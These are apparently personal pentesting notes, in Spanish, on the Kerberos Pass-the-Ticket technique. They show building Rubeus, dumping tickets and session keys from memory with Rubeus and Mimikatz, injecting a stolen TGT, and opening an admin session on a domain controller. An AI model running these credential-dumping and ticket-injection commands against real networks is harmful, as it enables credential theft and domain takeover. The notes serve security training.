# Pass The Ticket 

Tags: #AD #PtT 

```powershell 
❯ klist    # Mirar los tickets de Kerberos asociados al usuario 
```

## Rubeus - Windows 

* [Rubeus](https://github.com/GhostPack/Rubeus)
* [Visual Studio 2026](https://visualstudio.microsoft.com/es/downloads/)

Para instalar la herramienta se debe de compilar en 'Visual Studio' en el Windows a utilizar:
1. Descargar el .zip del código desde la url anterior y descomprimirlo
2. Iniciar la instalación de Visual Studio 
	- En la pestaña de los componentes... seleccionar 'Desarrollo de escritorio .NET' y dar click en instalar 
	- Escoger 'Abrir un proyecto o una solución' y seleccionar el archivo 'Rubeus' 
	- Actualizar el destino a .NET Framework 4.8 y dar click en 'continuar' 
3. En Visual Studio seleccionar el fichero raiz 'Rubeus'
4. Ir a la pestaña 'compilar' y dar click en 'Compilar Rubeus'

```bash 
# Utilizar Rubeus en Windows 
❯ .\Rubeus.exe -h     # Menú de ayuda 

# Se necesita un usuario administrador local 
❯ .\Rubeus.exe dump    # Dumpear todos los tickets más la clave de sesión que hay en memoria 
```

## Mimikatz 

* [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919)

```bash 
Descargar mimikatz 'mimikatz_trunk.zip' desde el enlace de arriba y pasar '/mimikatz_trunk/x64/mimikatz.exe' a la máquina Windows con el usuario comprometido 
```

```powershell 
# Utilizar un usuario 'administrador' local 

❯ .\mimikatz.exe
	❯ sekurlsa::tickets  # Dumpear todos los tickets más la clave de sesión que hay en memoria
```

## Inyectar el ticket en un cmd sin privilegios y obtener una sesión al DC

```powershell
# Utilizar Rubeus en Windows 
❯ .\Rubeus.exe ptt /ticket:

	# ticket = Es el ticket TGT que se obtiene desde Mimikatz 

❯ klist             # Mirar el ticket importado 
❯ dir \\DC01\c$     # Listar el contenido de un directorio de admin 

# Obtener una sesión remota en el DC
❯ Enter-PSSession -ComputerName DC01     # Obtener una sesión remota con usuario admin
```